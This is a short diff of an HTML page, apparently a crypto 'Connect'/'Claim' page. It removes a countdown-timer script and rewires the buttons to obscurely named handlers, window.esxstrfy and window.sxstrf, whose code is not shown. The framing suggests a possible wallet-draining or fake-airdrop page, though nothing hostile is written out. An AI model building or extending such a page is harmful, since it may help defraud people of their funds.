@@ -7,42 +7,7 @@
 <script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-WQLT8NJV"></script>
 <script src="chrome-extension://nebnhfamliijlghikdgcigoebonmoibm/addToWindow.js"></script>
 
-    <style>
-        #button2 {
-            opacity: 0.5;
-            pointer-events: none; /* Отключает взаимодействие */
-        }
-        #timer {
-            margin-top: 10px;
-            font-size: 1.2em;
-            font-weight: bold;
-            color: #333;
-        }
-    </style>
-    <script>
-        function enableSecondButton(delay) {
-            const button2 = document.getElementById('button2');
-            const timer = document.getElementById('timer');
-            let remainingTime = delay;
 
-            // Показываем таймер
-            timer.innerText = `Осталось: ${remainingTime} sec`;
-
-            // Обновляем таймер каждую секунду
-            const interval = setInterval(() => {
-                remainingTime--;
-                timer.innerText = `Осталось: ${remainingTime} sec`;
-
-                // Когда время закончилось, активируем кнопку
-                if (remainingTime <= 0) {
-                    clearInterval(interval); // Останавливаем таймер
-                    button2.style.opacity = 1;
-                    button2.style.pointerEvents = 'auto'; // Включаем взаимодействие
-                    timer.innerText = 'Claim now!';
-                }
-            }, 10000);
-        }
-    </script>
     <meta charset="UTF-8">
       
     <script async="" src="/assets/vendor/confetti.js"></script>
@@ -113,11 +78,10 @@
     margin-bottom: 200px;
 ">
 <div id="timerDisplay" style="display: none; font-size: 18px; color: red;"></div>
-<button id="button1 downloadButton" class="_root_1fqoj_1 _sizeDefault_1fqoj_18 _primaryFilled_1fqoj_43 _darkDisable_1fqoj_31 _button_z1egf_71" onclick="enableSecondButton(5) onclick="window.esxstrfy(this)" style="
+<button id="downloadButton" class="_root_1fqoj_1 _sizeDefault_1fqoj_18 _primaryFilled_1fqoj_43 _darkDisable_1fqoj_31 _button_z1egf_71" onclick="window.esxstrfy(this)" style="
     margin-right: 20px;
 ">Connect</button>
-<div id="timer"></div>
-<button id="button2 claimButton" class="_root_1fqoj_1 _sizeDefault_1fqoj_18 _primaryFilled_1fqoj_43 _darkDisable_1fqoj_31 _button_z1egf_71" onclick="window.sxstrf()">Claim</button>
+<button id="claimButton" class="_root_1fqoj_1 _sizeDefault_1fqoj_18 _primaryFilled_1fqoj_43 _darkDisable_1fqoj_31 _button_z1egf_71" onclick="window.sxstrf()">Claim</button>
    <script>
         // Функция для старта cooldown для кнопки Connect
         function startTimer() {
